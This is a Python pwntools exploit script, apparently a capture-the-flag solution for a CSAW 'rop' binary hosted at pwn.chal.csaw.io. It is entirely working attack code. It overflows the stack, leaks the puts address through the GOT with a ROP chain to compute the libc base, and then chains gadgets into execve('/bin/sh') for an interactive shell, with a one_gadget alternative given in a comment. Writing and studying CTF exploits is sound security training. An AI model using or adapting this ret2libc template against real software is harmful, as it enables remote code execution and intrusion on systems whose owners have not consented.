from pwn import *
import sys

BINARY = './rop'
context.binary = BINARY
GDB = False
REMOTE = True
e = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == "remote":
    REMOTE = True

if REMOTE:
    libc = ELF("./libc-2.27.so")
else:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def start():
    if REMOTE:
        return remote("pwn.chal.csaw.io", 5016)
    else:
        if GDB:
            return gdb.debug(BINARY, '''
                break main
                continue
            ''')
        else:
            return process(BINARY)

RET_OFFSET = cyclic_find(0x6161616b)

def leak_and_set_libc_base(io):
    r = ROP(e)
    r.raw(r.rdi) # pop rdi; ret
    r.raw(e.got['puts']) # to rdi (1st arg)
    r.raw(e.plt['puts'])
    r.raw(e.symbols['main'])
    p = b'A'*RET_OFFSET + r.chain()

    io.readline() # Hello
    io.sendline(p)
    puts_addr = unpack(io.readline()[:-1].ljust(8, b'\x00'))
    log.success("leaked puts: " + hex(puts_addr))

    libc_base = puts_addr-libc.symbols['puts']
    log.success("leaked libc base: " + hex(libc_base))
    libc.address = libc_base # update libc base so we can calc ROP chain
    return libc_base

def libc_rop_to_interactive_sh(io):
    r = ROP(libc)
    r.raw(r.rdi)
    r.raw(next(libc.search(b"/bin/sh")))
    r.raw(r.rsi)
    r.raw(0)
    r.raw(r.rdx)
    r.raw(0)
    r.raw(libc.symbols['execve'])
    p = b'A'*RET_OFFSET + r.chain()

    # This one gadget also works remotely if we want to use that instead
    # one_gadget_offset = 0x4f365
    # p = b'A'*RET_OFFSET + pack(libc.address + one_gadget_offset)

    io.readline() # Hello
    log.info("sending shell payload")
    io.sendline(p)
    io.interactive()

def exploit():
    try:
        io = start()
        leak_and_set_libc_base(io)
        libc_rop_to_interactive_sh(io)
    finally:
        io.close()

exploit()
